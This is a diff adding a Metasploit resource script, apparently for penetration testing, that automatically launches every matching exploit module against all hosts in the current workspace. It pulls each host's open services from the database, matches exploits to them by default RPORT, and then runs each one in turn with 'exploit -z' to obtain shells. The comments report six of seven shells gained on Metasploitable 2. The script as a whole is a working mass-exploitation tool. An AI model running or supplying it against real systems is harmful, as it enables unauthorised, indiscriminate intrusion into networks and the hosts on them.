@@ -1,0 +1,84 @@
+# autosploit.rc
+# Author: Sliim (Github: @Sliim / Twitter: @_Sliim_)
+
+# This Metasploit resource script will run several exploits against
+# present hosts in current workspace. It get all services for all hosts,
+# and try to find exploits where default RPORT option match with a service.
+# We can blacklist some modules we don't want, the BLACKLIST option is a
+# comma separated list of module to disable.
+# The TARGET_PLATFORM option can be used to define which platform we target
+# (ex: if all hosts are linux os, no need to launch windows exploits).
+# Tested on metasploitable 2. Got 6/7 shells without effort :)
+
+<ruby>
+begin
+  framework.db.hosts
+rescue ::ActiveRecord::ConnectionNotEstablished
+  print_error("Database connection isn't established")
+  return
+end
+
+# Check for target platform list
+if (framework.datastore['TARGET_PLATFORM'] == nil)
+  run_single("setg TARGET_PLATFORM aix,android,apple_ios,bsdi,dialup,firefox,freebsd,hpux,irix,linux,mainframe,multi,netware,osx,solaris,unix,windows")
+end
+
+# Check for blacklisted modules
+blacklist = []
+if (framework.datastore['BLACKLIST'] != nil)
+   blacklist = framework.datastore['BLACKLIST'].split(',')
+end
+
+sploits = {}
+count = 0
+ran = 0
+
+print_status("Getting vulns list, this may take a while...")
+framework.db.hosts.each do |host|
+  port_list = []
+  sploits[host.address] = []
+  print_status("Host: #{host.address} - #{host.os_name}")
+  print_status("Services: ")
+  host.services.each do |serv|
+    next if not serv.host
+    next if (serv.state != Msf::ServiceState::Open)
+    print_status("> :#{serv.port} - #{serv.proto} - #{serv.name}")
+    port_list << serv.port.to_i if not port_list.include? serv.port.to_i
+  end
+
+  framework.modules.exploits.each do |name, mod|
+    next if not framework.datastore['TARGET_PLATFORM'].split(',').include? name.split('/')[0]
+    next if blacklist.include? name
+
+    # TODO Improve platform detection / exploit selection
+    if host.os_name
+      next if name.split('/')[0] == 'windows' && ! host.os_name.match(/Windows/)
+      next if name.split('/')[0] != 'windows' && host.os_name.match(/Windows/)
+    end
+    next unless mod
+    m = mod.new
+    next unless m.datastore.has_key? 'RPORT'
+    if port_list.include? m.datastore['RPORT'].to_i
+      sploits[host.address] << name
+      count += 1
+    end
+  end
+end
+
+print_status("Ok dude! I found #{count} matching sploits! #{'Take a beer!' if count > 100}")
+
+sploits.each do |host, s|
+  s.each do |sploit|
+    print_status("[#{ran+1}/#{count}] Deploying exploit #{sploit} against #{host}")
+    run_single("use #{sploit}")
+    run_single("set RHOST #{host}")
+    run_single("set LPORT #{4444 + rand(65535-44444)}")
+    run_single("show options")
+    run_single("exploit -z")
+    ran += 1
+    print_status('Take another beer ;)') if ran % 100 == 0
+  end
+end
+
+print_status("Done. Tried #{ran}/#{count} exploits.")
+</ruby>
